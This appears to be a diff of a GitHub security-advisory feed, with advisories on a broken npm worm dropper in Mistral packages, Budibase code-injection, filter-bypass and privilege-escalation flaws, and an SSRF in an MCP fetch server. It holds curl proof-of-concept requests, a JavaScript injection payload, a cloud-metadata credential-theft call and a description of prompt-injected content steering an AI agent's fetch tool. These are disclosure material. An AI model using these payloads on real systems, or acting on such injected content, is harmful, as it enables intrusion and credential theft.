-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server] Budibase: CouchDB Reduce Injection via Unsanitized Calculation Parameter in V1 Views API ]]></title>
-        <id>https://github.com/advisories/GHSA-363w-hvwh-w7m6</id>
-        <link href="https://github.com/advisories/GHSA-363w-hvwh-w7m6"/>
-        <updated>2026-05-18T17:47:59.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="security-advisory-couchdb-reduce-injection-via-unsanitized-calculation-parameter-in-v1-views-api">Security Advisory: CouchDB Reduce Injection via Unsanitized Calculation Parameter in V1 Views API</h1>
-<p><strong>Affected Software:</strong> Budibase
-<strong>Affected Component:</strong> <code>packages/server/src/api/controllers/view/viewBuilder.ts</code>, <code>packages/server/src/api/routes/view.ts</code>
-<strong>CWE:</strong> CWE-94 (Improper Control of Generation of Code)
-<strong>Discovery Date:</strong> 2026-03-24</p>
-<hr>
-<h2 id="summary">Summary</h2>
-<p>The V1 Views API (<code>POST /api/views</code>) accepts a <code>calculation</code> parameter from the request body that is interpolated directly into a CouchDB reduce function definition without validation. Although an internal <code>SCHEMA_MAP</code> object defines the valid calculation types (<code>sum</code>, <code>count</code>, <code>stats</code>), no actual validation is performed against this map before the value is used in string interpolation.</p>
-<p>A user with Builder permissions can inject arbitrary JavaScript code that will be executed within the CouchDB JavaScript engine when the view is queried.</p>
-<hr>
-<h2 id="affected-component">Affected Component</h2>
-<p><strong>Route:</strong> <code>POST /api/views</code> (V1 legacy views endpoint)
-<strong>File:</strong> <code>packages/server/src/api/routes/view.ts</code>, line 45</p>
-<pre><code class="language-js">.post("/api/views", viewController.v1.save)
-</code></pre>
-<p>Note: This route has no Joi request body validator, unlike the V2 views endpoint which uses <code>viewValidator()</code>.</p>
-<p><strong>Vulnerable code:</strong> <code>packages/server/src/api/controllers/view/viewBuilder.ts</code>, line 213</p>
-<pre><code class="language-js">const reduction = field &amp;&amp; calculation ? { reduce: `_${calculation}` } : {}
-
-return {
-  meta: { field, tableId, groupBy, filters, schema, calculation, ... },
-  map: `function (doc) { ... }`,
-  ...reduction,    // &lt;-- unvalidated calculation string becomes CouchDB reduce
+<p><code>src/browser.ts:53-64</code></p>
+<pre><code class="language-ts">export async function navigateTo(ctx: BrowserContext, url: string): Promise&lt;Page&gt; {
+  ...
+  await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30000 });  // line 63
+  return page;
 }
 </code></pre>
-<hr>
-<h2 id="vulnerability-detail">Vulnerability Detail</h2>
-<p>The <code>viewBuilder</code> function constructs a CouchDB design document view definition. It correctly sanitizes all inputs that flow into the <code>map</code> function string (using <code>JSON.stringify</code> for field names and a strict <code>TOKEN_MAP</code> allowlist for filter operators).</p>
-<p>However, the <code>calculation</code> parameter follows a different path:</p>
-<ol>
-<li>User submits <code>calculation</code> via <code>POST /api/views</code> request body</li>
-<li>No Joi validator is present on this V1 route</li>
-<li><code>viewBuilder</code> receives <code>calculation</code> as a raw string</li>
-<li>It is interpolated as: <code>reduce: `_${calculation}`</code></li>
-<li>This reduce definition is saved to a CouchDB design document</li>
-<li>When the view is queried, CouchDB evaluates the reduce value</li>
-</ol>
-<p>CouchDB's behavior for reduce functions:</p>
-<ul>
-<li>Values starting with <code>_</code> followed by a known built-in (<code>_sum</code>, <code>_count</code>, <code>_stats</code>) are executed as native reducers</li>
-<li>Any other value is treated as a <strong>JavaScript function string</strong> and executed in CouchDB's SpiderMonkey JS engine</li>
-</ul>
-<p>The <code>SCHEMA_MAP</code> object in the same file defines <code>sum</code>, <code>count</code>, and <code>stats</code> as valid keys, but this map is only used for schema construction — it is never used as an input validator for the <code>calculation</code> parameter.</p>
-<hr>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<p><strong>Prerequisites:</strong> Authenticated session with Builder role permissions.</p>
-<p><strong>1. Send a crafted view creation request:</strong></p>
-<pre><code class="language-bash">curl -X POST https://&lt;budibase-instance&gt;/api/views \
-  -H "Content-Type: application/json" \
-  -H "Cookie: &lt;builder-session-cookie&gt;" \
-  -d '{
-    "name": "test_view",
-    "tableId": "&lt;valid-table-id&gt;",
-    "field": "amount",
-    "calculation": "stats\"); } function(keys,values,rereduce){ var data = \"\"; for(var i in this) { data += i + \"=\" + this[i] + \",\"; } return data; } //"
-  }'
-</code></pre>
-<p><strong>2. Query the created view:</strong></p>
-<pre><code class="language-bash">curl https://&lt;budibase-instance&gt;/api/views/test_view?group=true \
-  -H "Cookie: &lt;builder-session-cookie&gt;"
-</code></pre>
-<p><strong>3. Expected result:</strong> The injected JavaScript function executes in CouchDB's JS context during reduce evaluation. The function can:</p>
-<ul>
-<li>Enumerate objects available in the CouchDB sandbox</li>
-<li>Access document data from the reduce <code>values</code> parameter</li>
-<li>Return arbitrary data in the view response</li>
-</ul>
-<p><strong>Simplified test:</strong> To verify the injection point without complex payloads:</p>
-<pre><code class="language-json">{
-  "name": "calc_test",
-  "tableId": "&lt;valid-table-id&gt;",
-  "field": "amount",
-  "calculation": "INVALID_NOT_A_BUILTIN"
-}
-</code></pre>
-<p>This produces <code>reduce: "_INVALID_NOT_A_BUILTIN"</code>. CouchDB will reject this as neither a valid built-in nor a valid function, confirming that arbitrary strings reach the reduce evaluator.</p>
-<hr>
+<p><code>url</code> flows directly from the MCP tool argument to <code>page.goto</code> with no validation. Playwright will navigate to any URL the network stack can reach. The page DOM is returned in the tool response via <code>extractContent</code>. Internal pages (loopback admin UIs, cloud metadata endpoints reachable from the host, intranet services) are extractable.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>Neither handler validates URL targets before dispatch. The tool descriptions ("fetches web page content using a real browser ... e.g. Notion, Google Docs, Jira, Confluence, Linear, Slack, or any SaaS/private page") frame the intended usage as <strong>public SaaS web pages</strong>, not loopback or link-local hosts — but no code enforces that intent.</p>
+<p>The fix shape (apply to both tools): after URL parsing, resolve to IP, reject if private/loopback/link-local. Same defense as the well-known SSRF-guard pattern shipped by other MCP fetchers in the ecosystem (e.g., <code>Akitaroh/scraper-mcp</code> <code>src/security/url-guard.ts</code>).</p>
+<h2 id="auth-boundary-violated">Auth boundary violated</h2>
+<p><strong>Boundary type:</strong> MCP tool-argument boundary plus the local-network trust boundary. The MCP server typically sits inside a trust boundary (developer laptop with loopback services, cloud VM with IMDS, k8s pod with service account). The tools allow the MCP client to dispatch HTTP requests across that boundary.</p>
+<p><strong>Respected/violated trace:</strong> Per the tool descriptions, the expected respected boundary is "public SaaS web pages." That expectation is violated by any request reaching a host the user didn't intend to expose (127.0.0.1:6379 Redis, 169.254.169.254 cloud metadata, 192.168.0.1 internal admin).</p>
 <h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Code execution:</strong> Arbitrary JavaScript runs in CouchDB's SpiderMonkey sandbox</li>
-<li><strong>Data access:</strong> The reduce function receives all matching document values, allowing data exfiltration across the database</li>
-<li><strong>Scope limitation:</strong> CouchDB's JS sandbox prevents filesystem or network access — this is not OS-level RCE</li>
-<li><strong>Authentication required:</strong> Attacker must have Builder role, which already grants significant application access</li>
-<li><strong>Persistence:</strong> The injected reduce function persists in the design document and executes on every view query</li>
-</ul>
-<hr>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Add an allowlist validation in <code>viewBuilder</code> before the reduce interpolation:</p>
-<pre><code class="language-typescript">const VALID_CALCULATIONS = ["sum", "count", "stats"];
-
-if (calculation &amp;&amp; !VALID_CALCULATIONS.includes(calculation)) {
-  throw new Error(`Invalid calculation type: ${calculation}`);
-}
-
-const reduction = field &amp;&amp; calculation ? { reduce: `_${calculation}` } : {};
-</code></pre>
-<p>Additionally, add a Joi validator to the V1 views route to match the V2 endpoint:</p>
-<pre><code class="language-typescript">// In packages/server/src/api/routes/view.ts
-.post("/api/views", v1ViewValidator(), viewController.v1.save)
-</code></pre>
-<hr>
-<h2 id="additional-context">Additional Context</h2>
-<p>The V2 views API (<code>POST /api/v2/views</code>) uses <code>viewValidator()</code> with Joi schema validation and a separate calculation handling path. This finding is specific to the V1 legacy endpoint which lacks equivalent input validation.</p>
-<p>The <code>map</code> function string in the same code is properly protected — all user inputs reaching it are escaped via <code>JSON.stringify()</code> or validated against a strict <code>TOKEN_MAP</code> allowlist. Only the <code>reduce</code> path is affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-363w-hvwh-w7m6">https://github.com/Budibase/budibase/security/advisories/GHSA-363w-hvwh-w7m6</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.38.1">https://github.com/Budibase/budibase/releases/tag/3.38.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-363w-hvwh-w7m6">https://github.com/advisories/GHSA-363w-hvwh-w7m6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-363w-hvwh-w7m6</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-18T17:47:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[budibase] Budibase: Row Action Trigger Bypasses View Row Filter Security Boundary Allowing Action on Out-of-Scope Rows]]></title>
-        <id>https://github.com/advisories/GHSA-3263-v5v9-xq8q</id>
-        <link href="https://github.com/advisories/GHSA-3263-v5v9-xq8q"/>
-        <updated>2026-05-18T17:44:23.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The row action trigger endpoint (<code>POST /api/tables/:sourceId/actions/:actionId/trigger</code>) fails to validate that the user-supplied <code>rowId</code> is within the scope of the view's row filters. A user with access to a filtered view can trigger row actions on any row in the underlying table, including rows explicitly excluded by the view's security filters.</p>
-<h2 id="details">Details</h2>
-<p>View filters in Budibase are treated as a security boundary. The search path (<code>packages/server/src/sdk/workspace/rows/search.ts:93-94</code>) explicitly enforces view query filters with the comment: <em>"that could let users find rows they should not be allowed to access."</em></p>
-<p>However, the row action trigger path bypasses this enforcement entirely:</p>
 <ol>
-<li><p><strong>Route</strong> (<code>packages/server/src/api/routes/rowAction.ts:55-59</code>): Accepts a <code>sourceId</code> that can be a viewId.</p>
+<li><p><strong>Cloud credential theft</strong> — server on EC2 / GCE / Azure VM. MCP client invokes <code>auth_fetch({ url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;" })</code> and receives temporary credentials in the tool response. Or invokes <code>download_media({ urls: [...], output_dir: "/tmp/exfil" })</code> to persist them to disk.</p>
 </li>
-<li><p><strong>Middleware</strong> (<code>packages/server/src/middleware/triggerRowActionAuthorised.ts:24-55</code>): Correctly validates that the user has READ permission on the view and that the row action is enabled for that view. However, at line 55 it sets <code>ctx.params.tableId = tableId</code> where <code>tableId</code> is the <strong>underlying table</strong> extracted from the viewId — the viewId is discarded.</p>
+<li><p><strong>Internal service enumeration</strong> — MCP client probes private-range hosts (10/8, 172.16/12, 192.168/16). Each <code>auth_fetch</code> returns the page DOM; each <code>download_media</code> writes the response to disk.</p>
+</li>
+<li><p><strong>Loopback exploitation</strong> — server runs alongside Redis (127.0.0.1:6379), ElasticSearch (127.0.0.1:9200), or internal admin UIs. MCP client reads them via <code>auth_fetch</code>.</p>
+</li>
+<li><p><strong>Disk-write side channel</strong> (<code>download_media</code> only) — output_dir is also user-controlled, with no documented restriction. An MCP client can request <code>output_dir = "/some/user-writable-shared-dir"</code> and exfil internal-service responses to a location accessible to a co-tenant process.</p>
 </li>
 </ol>
-<pre><code class="language-typescript">// triggerRowActionAuthorised.ts:24-26
-const tableId = isTableIdOrExternalTableId(sourceId)
-  ? sourceId
-  : getTableIdFromViewId(sourceId)  // extracts underlying table
+<p>The injection vector is any content reaching the model that prompts a fetch tool call. The tool description explicitly says "MUST be used instead of Fetch/web_fetch when the page requires login" — meaning the model is encouraged to call this tool for any "private page" mention, which a prompt-injected upstream content can trivially trigger.</p>
+<h2 id="proof-of-concept-non-destructive">Proof of concept (non-destructive)</h2>
+<p><code>poc.mjs</code> — replicates the <code>download_media</code> handler's HTTP-fetch + file-write chain against a local fake-internal HTTP service. Playwright's <code>ctx.request.get(url)</code> is replaced with the equivalent <code>fetch(url)</code> for the bug case (a URL needing no auth) so the demo runs without browser deps. The structural defect — "no host validation before HTTP dispatch" — is identical.</p>
+<pre><code>[PoC] fake internal-only service: 127.0.0.1:36105
+[PoC] simulating MCP client calling download_media({
+        urls: ['http://127.0.0.1:36105/secrets'],
+        output_dir: '/tmp/auth-fetch-exfil-aU1jjv'
+      })
+[PoC] no IP / host validation exists at tools.ts:236-238 before ctx.request.get(url)
+[PoC] ✓ SSRF + DISK-EXFIL CONFIRMED
+        File written to: /tmp/auth-fetch-exfil-aU1jjv/file-1.json
+        Persisted content (187 bytes):
+          {
+            "AccessKeyId": "AKIA-FAKE-FROM-POC",
+            "SecretAccessKey": "fake-secret-marker-NOT-REAL",
+            "Note": "In a real exploit this would be AWS IMDS at 169.254.169.254/latest/meta-data/..."
+          }
+</code></pre>
+<p>Exit code <code>0</code>. SHA-256 <code>poc.mjs</code>: <code>4cea53f1a618581fc67f9a8bd07a7a2b22274f42cdbf7f3c658519673aaf7568</code>. The PoC only contacts <code>127.0.0.1</code> on an ephemeral port; the fake-credentials string contains the literal <code>FAKE</code> marker so no downstream system can mistake it for real credentials. The exfil directory is cleaned up after the demo.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Add a <code>assertSafeUrl</code> helper (same shape as in the matching egoist/fetch-mcp advisory) called before any HTTP dispatch — at <code>tools.ts:236</code> inside the download_media loop, and at the top of <code>navigateTo</code> in <code>browser.ts:53</code>:</p>
+<pre><code class="language-ts">import dns from 'node:dns/promises'
+import net from 'node:net'
 
-// Line 55: viewId context is lost
-ctx.params.tableId = tableId
-</code></pre>
-<ol start="3">
-<li><strong>Controller</strong> (<code>packages/server/src/api/controllers/rowAction/run.ts:11</code>): Reads only <code>tableId</code> from params — the view context is gone.</li>
-</ol>
-<pre><code class="language-typescript">const { tableId, actionId } = ctx.params
-const { rowId } = ctx.request.body
-await sdk.rowActions.run(tableId, actionId, rowId, ctx.user)
-</code></pre>
-<ol start="4">
-<li><strong>SDK</strong> (<code>packages/server/src/sdk/workspace/rowActions/crud.ts:254</code>): Fetches the row using <code>sdk.rows.find(tableId, rowId)</code> — directly from the table with no view filter enforcement.</li>
-</ol>
-<pre><code class="language-typescript">const row = await sdk.rows.find(tableId, rowId)  // No view filter check
-</code></pre>
-<p>The <code>sdk.rows.find</code> function (<code>packages/server/src/sdk/workspace/rows/internal.ts:67-88</code>) fetches the row by ID directly from the database, only validating that <code>row.tableId === tableId</code>. It never checks whether the row matches the view's query filters.</p>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-bash"># Prerequisites:
-# 1. Create a table with a "status" column containing rows: "active" and "archived"
-# 2. Create a view filtering to status="active", assign it to BASIC role
-# 3. Enable a row action for that view
-# 4. Note the rowId of an "archived" row (not visible through the view)
-
-# As a BASIC-role user with access only to the filtered view:
-# Trigger the row action on a row OUTSIDE the view's filter scope
-
-curl -X POST 'http://localhost:10000/api/tables/&lt;viewId&gt;/actions/&lt;actionId&gt;/trigger' \
-  -H 'Cookie: budibase:auth=&lt;basic_user_jwt&gt;' \
-  -H 'Content-Type: application/json' \
-  -d '{"rowId": "&lt;archived_row_id&gt;"}'
-
-# Expected: 403 or 404 (row not in view scope)
-# Actual: 200 {"message": "Row action triggered."}
-# The automation executes with the full archived row data,
-# despite view filters excluding it from the user's access.
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>A user with BASIC role access to a filtered view can execute row actions (automations) on <strong>any row</strong> in the underlying table, including rows hidden by the view's security filters. The impact depends on what the triggered automation does:</p>
-<ul>
-<li><strong>Information disclosure</strong>: The automation receives the full row data as input, which may contain fields/values the user should not see.</li>
-<li><strong>Unauthorized data modification</strong>: If the automation modifies rows, the attacker can cause changes to rows outside their authorized scope.</li>
-<li><strong>Unauthorized actions</strong>: If the automation sends notifications, calls webhooks, or performs other side effects, the attacker can trigger these for out-of-scope rows.</li>
-</ul>
-<p>This breaks the security model established by view filters, which are explicitly documented as preventing users from accessing rows they should not see.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>The middleware should pass the <code>viewId</code> to the controller, and the SDK <code>run</code> function should validate the row against the view's filters before executing the automation.</p>
-<p>In <code>packages/server/src/middleware/triggerRowActionAuthorised.ts</code>, preserve the sourceId:</p>
-<pre><code class="language-typescript">// Line 55: preserve the original sourceId for downstream filter validation
-ctx.params.tableId = tableId
-ctx.params.sourceId = viewId || tableId  // ADD THIS
-</code></pre>
-<p>In <code>packages/server/src/api/controllers/rowAction/run.ts</code>, pass the sourceId:</p>
-<pre><code class="language-typescript">export async function run(
-  ctx: Ctx&lt;RowActionTriggerRequest, RowActionTriggerResponse&gt;
-) {
-  const { tableId, actionId, sourceId } = ctx.params
-  const { rowId } = ctx.request.body
-
-  await sdk.rowActions.run(tableId, actionId, rowId, ctx.user, sourceId)
-  ctx.body = { message: "Row action triggered." }
-}
-</code></pre>
-<p>In <code>packages/server/src/sdk/workspace/rowActions/crud.ts</code>, validate the row against view filters:</p>
-<pre><code class="language-typescript">export async function run(
-  tableId: any,
-  rowActionId: any,
-  rowId: string,
-  user: User,
-  sourceId?: string
-) {
-  const table = await sdk.tables.getTable(tableId)
-  if (!table) {
-    throw new HTTPError("Table not found", 404)
+async function assertSafeUrl(rawUrl: string): Promise&lt;URL&gt; {
+  const parsed = new URL(rawUrl)
+  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error(`Unsupported scheme`)
+  const host = parsed.hostname
+  const addresses = net.isIP(host)
+    ? [host]
+    : (await dns.lookup(host, { all: true })).map(a =&gt; a.address)
+  for (const addr of addresses) {
+    if (isPrivateOrLinkLocal(addr)) throw new Error(`Refusing to fetch ${addr}`)
   }
-
-  // If triggered from a view, validate the row is within the view's scope
-  if (sourceId &amp;&amp; isViewId(sourceId)) {
-    const result = await sdk.rows.search({
-      viewId: sourceId,
-      query: { equal: { _id: rowId } },
-      limit: 1,
-    })
-    if (!result.rows.length) {
-      throw new HTTPError("Row not found in view scope", 403)
-    }
-  }
-
-  const { automationId } = await get(tableId, rowActionId)
-  const automation = await sdk.automations.get(automationId)
-  const row = await sdk.rows.find(tableId, rowId)
-  // ... rest unchanged
+  return parsed
 }
 </code></pre>
+<p>Where <code>isPrivateOrLinkLocal</code> blocks 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1, fc00::/7, fe80::/10.</p>
+<p>For <code>download_media</code> specifically, also constrain <code>output_dir</code>: resolve it under a fixed root (e.g., <code>~/.auth-fetch-mcp/downloads/</code>) and reject if the resolved path escapes that root.</p>
 <h3 id="references">References</h3>
 <ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-3263-v5v9-xq8q">https://github.com/Budibase/budibase/security/advisories/GHSA-3263-v5v9-xq8q</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.38.1">https://github.com/Budibase/budibase/releases/tag/3.38.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-3263-v5v9-xq8q">https://github.com/advisories/GHSA-3263-v5v9-xq8q</a></li>
+<li><a href="https://github.com/ymw0407/auth-fetch-mcp/security/advisories/GHSA-hv85-774v-26fg">https://github.com/ymw0407/auth-fetch-mcp/security/advisories/GHSA-hv85-774v-26fg</a></li>
+<li><a href="https://github.com/ymw0407/auth-fetch-mcp/releases/tag/v3.0.1">https://github.com/ymw0407/auth-fetch-mcp/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-hv85-774v-26fg">https://github.com/advisories/GHSA-hv85-774v-26fg</a></li>
 </ul>
 ]]></content>
         <author>
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3263-v5v9-xq8q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-18T17:44:22.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/worker] Budibase: Builder-to-Admin Privilege Escalation via onboardUsers Endpoint Without SMTP Configuration]]></title>
-        <id>https://github.com/advisories/GHSA-c54j-xp92-wh28</id>
-        <link href="https://github.com/advisories/GHSA-c54j-xp92-wh28"/>
-        <updated>2026-05-18T17:42:25.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>POST /api/global/users/onboard</code> endpoint is protected by <code>workspaceBuilderOrAdmin</code> middleware, allowing any user with builder permissions to access it. When SMTP email is not configured (the default for self-hosted Budibase instances), this endpoint bypasses the admin-restricted invite flow and directly creates users via <code>bulkCreate</code>, accepting arbitrary <code>admin</code> and <code>builder</code> role assignments from the request body. A builder-level user can create a new global admin account and receive the generated password in the response, achieving full privilege escalation.</p>
-<h2 id="details">Details</h2>
-<p>The vulnerability stems from a mismatch between the authorization level of the <code>onboardUsers</code> endpoint and the user-creation capabilities it exposes when SMTP is not configured.</p>
-<p><strong>Route definition</strong> (<code>packages/worker/src/api/routes/global/users.ts:93-109</code>):</p>
-<pre><code class="language-typescript">builderOrAdminRoutes  // &lt;-- allows builders, not just admins
-  .post(
-    "/api/global/users/onboard",
-    buildInviteMultipleValidation(),
-    controller.onboardUsers
-  )
-</code></pre>
-<p>Compare with the <code>invite</code> and <code>inviteMultiple</code> endpoints which are correctly admin-only:</p>
